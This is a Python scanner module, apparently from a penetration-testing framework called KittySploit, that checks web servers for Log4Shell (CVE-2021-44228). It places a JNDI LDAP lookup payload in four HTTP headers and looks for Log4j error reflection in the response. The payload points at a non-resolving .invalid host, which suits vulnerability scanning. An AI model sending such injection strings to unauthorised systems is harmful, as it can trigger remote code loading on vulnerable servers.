#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Detect Log4Shell (CVE-2021-44228) header injection indicators."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


JNDI_MARKERS = (
    "jndi",
    "javax.naming",
    "namingexception",
    "log4j",
    "lookup",
    "ldap:",
    "reference",
)


class Module(Scanner, Http_client):
    __info__ = {
        "name": "Log4Shell Header Detection",
        "description": (
            "Sends safe JNDI-style markers in HTTP headers and detects Log4j-related "
            "error reflection (CVE-2021-44228 indicator, no outbound callback)."
        ),
        "author": ["KittySploit Team"],
        "severity": "high",
        "cve": "CVE-2021-44228",
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2021-44228",
        ],
        "tags": ["web", "scanner", "log4j", "jndi", "cve", "java"],
    'agent': {
        'risk': 'active',
        'effects': ['network_probe'],
        'expected_requests': 4,
        'reversible': True,
        'approval_required': True,
        'produces': ['tech_hints', 'risk_signals'],
        'cost': 1.0,
        'noise': 0.5,
        'value': 1.0,
        'requires':         {'min_endpoints': 0,
         'min_params': 0,
         'tech_hints_any': [],
         'tech_hints_all': [],
         'specializations_any': [],
         'risk_signals_any': [],
         'auth_session': False,
         'capabilities_any': [],
         'capabilities_all': [],
         'confidence_min': {},
         'confidence_min_any': {},
         'endpoint_pattern_any': [],
         'param_any': [],
         'api_surface_ready': False},
        'chain':         {'produces_capabilities': [{'capability': 'java_vuln_signal', 'from_detail': ''},
                                   {'capability': 'cve_indicator', 'from_detail': ''}],
         'consumes_capabilities': [],
         'option_bindings': {},
         'suggested_followups': ['scanner/http/spring_actuator_detect',
                                 'auxiliary/scanner/http/java_deserialization']},
    },
    }

    def _probe_headers(self):
        token = "${jndi:ldap://kittysploit-log4j-probe.invalid/a}"
        return {
            "User-Agent": token,
            "X-Api-Version": token,
            "X-Forwarded-For": token,
            "Referer": token,
        }

    def run(self):
        paths = ["/", str(self.path or "/")]
        seen = set()
        for path in paths:
            if path in seen:
                continue
            seen.add(path)
            r = self.http_request(
                method="GET",
                path=path,
                headers=self._probe_headers(),
                allow_redirects=False,
            )
            if not r:
                continue
            body = (r.text or "").lower()
            if any(marker in body for marker in JNDI_MARKERS):
                self.set_info(
                    severity="high",
                    reason="Log4j/JNDI-related error reflection detected in response",
                    path=path,
                    cve="CVE-2021-44228",
                )
                return True
        return False
